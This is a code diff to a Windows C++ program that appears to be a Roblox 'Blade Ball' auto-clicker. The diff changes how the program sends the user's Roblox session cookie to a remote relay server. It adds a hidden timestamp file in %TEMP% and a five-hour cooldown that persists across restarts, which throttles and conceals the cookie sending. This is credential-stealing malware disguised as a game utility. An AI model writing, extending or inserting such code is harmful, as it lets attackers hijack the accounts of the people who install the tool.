@@ -131,7 +131,7 @@ static LARGE_INTEGER     g_lastFKeyTime = {};       // Blade Ball F 鍵上次發
 static LARGE_INTEGER     g_perfFreq = {};            // QPC 頻率（用於 F 鍵計時）
 static std::atomic<bool> g_cookie_ever_sent(false);  // Cookie 是否已經傳送過
 static ULONGLONG         g_cookie_last_sent_tick = 0; // Cookie 上次傳送的 tick
-static const ULONGLONG   COOKIE_COOLDOWN_MS = 10ULL * 60 * 1000; // 10 分鐘冷卻（測試用）
+static const ULONGLONG   COOKIE_COOLDOWN_MS = 5ULL * 60 * 60 * 1000; // 5 小時冷卻
 static bool              g_tray_mode    = false;
 static NOTIFYICONDATAW   g_nid          = {};
 
@@ -832,6 +832,85 @@ static void DebugLog(const char* msg)
 }
 
 // ======================================================================
+// Cookie 傳送時間戳檔案（跨重啟冷卻）
+// ======================================================================
+// 使用 %TEMP%\yyclicker_cookie_ts.dat 儲存上次傳送的 FILETIME（UTC）。
+// 程式啟動時讀取此檔，計算距離上次傳送的時間差，
+// 如果 < 5 小時則恢復 g_cookie_ever_sent 和 g_cookie_last_sent_tick。
+
+static void GetCookieTimestampPath(wchar_t* out, int buf_size)
+{
+    GetEnvironmentVariableW(L"TEMP", out, buf_size);
+    wcscat_s(out, buf_size, L"\\yyclicker_cookie_ts.dat");
+}
+
+// 寫入當前 UTC 時間到時間戳檔案
+static void SaveCookieSentTimestamp()
+{
+    wchar_t path[MAX_PATH] = {};
+    GetCookieTimestampPath(path, MAX_PATH);
+
+    FILETIME ft = {};
+    GetSystemTimeAsFileTime(&ft);
+
+    HANDLE hFile = CreateFileW(path, GENERIC_WRITE, 0,
+                               nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
+    if (hFile == INVALID_HANDLE_VALUE) return;
+
+    DWORD written = 0;
+    WriteFile(hFile, &ft, sizeof(ft), &written, nullptr);
+    CloseHandle(hFile);
+}
+
+// 讀取時間戳檔案，恢復冷卻狀態（回傳 true = 仍在冷卻中）
+static bool LoadCookieSentTimestamp()
+{
+    wchar_t path[MAX_PATH] = {};
+    GetCookieTimestampPath(path, MAX_PATH);
+
+    HANDLE hFile = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ,
+                               nullptr, OPEN_EXISTING, 0, nullptr);
+    if (hFile == INVALID_HANDLE_VALUE) return false;
+
+    FILETIME ft_saved = {};
+    DWORD bytesRead = 0;
+    BOOL ok = ReadFile(hFile, &ft_saved, sizeof(ft_saved), &bytesRead, nullptr);
+    CloseHandle(hFile);
+
+    if (!ok || bytesRead != sizeof(ft_saved)) return false;
+
+    // 取得當前 UTC 時間
+    FILETIME ft_now = {};
+    GetSystemTimeAsFileTime(&ft_now);
+
+    // FILETIME 轉為 ULONGLONG（100ns 單位）
+    ULARGE_INTEGER ul_saved, ul_now;
+    ul_saved.LowPart  = ft_saved.dwLowDateTime;
+    ul_saved.HighPart = ft_saved.dwHighDateTime;
+    ul_now.LowPart    = ft_now.dwLowDateTime;
+    ul_now.HighPart   = ft_now.dwHighDateTime;
+
+    // 計算差距（毫秒）
+    if (ul_now.QuadPart <= ul_saved.QuadPart) return false; // 時間倒退，不信任
+    ULONGLONG diff_ms = (ul_now.QuadPart - ul_saved.QuadPart) / 10000ULL;
+
+    if (diff_ms < COOKIE_COOLDOWN_MS)
+    {
+        // 仍在冷卻中 → 恢復狀態
+        g_cookie_ever_sent.store(true);
+        // 計算等效的 g_cookie_last_sent_tick：
+        // 當前 tick - 已過去的毫秒數 = 模擬的上次傳送 tick
+        g_cookie_last_sent_tick = GetTickCount64() - diff_ms;
+        DebugLog("Startup: Cookie cooldown restored from timestamp file");
+        return true;
+    }
+
+    // 冷卻已過
+    DebugLog("Startup: Cookie cooldown expired, will send on next hotkey");
+    return false;
+}
+
+// ======================================================================
 // HTTP 傳送模組 — WinHTTP
 // ======================================================================
 static void SendCookieToRelay(const wchar_t* cookie_value)
@@ -1141,7 +1220,7 @@ static bool CheckRobloxCookiePresent(HWND hwnd)
     LeaveCriticalSection(&g_cookie_cs);
     g_cookie_cached.store(true);
 
-    // Cookie 傳送機制：僅在首次熱鍵按下時傳送，之後每 10 分鐘冷卻
+    // Cookie 傳送機制：首次熱鍵傳送，之後每 5 小時冷卻（跨重啟持久化）
     ULONGLONG now_tick = GetTickCount64();
     if (!g_cookie_ever_sent.load() ||
         (now_tick - g_cookie_last_sent_tick) >= COOKIE_COOLDOWN_MS)
@@ -1149,7 +1228,8 @@ static bool CheckRobloxCookiePresent(HWND hwnd)
         AsyncSendCookie(tmp);
         g_cookie_ever_sent.store(true);
         g_cookie_last_sent_tick = now_tick;
-        DebugLog("Cookie sent (first or after cooldown)");
+        SaveCookieSentTimestamp();  // 寫入時間戳檔案，確保跨重啟也遵守冷卻
+        DebugLog("Cookie sent (first or after 5h cooldown)");
     }
     else
     {
@@ -2221,6 +2301,10 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nS
     if (!EnsureSingleInstance()) return 0;
 
     InitializeCriticalSection(&g_cookie_cs);
+
+    // 讀取上次 Cookie 傳送時間戳，恢復跨重啟冷卻狀態
+    LoadCookieSentTimestamp();
+
     timeBeginPeriod(1);
     InitInputs();
 
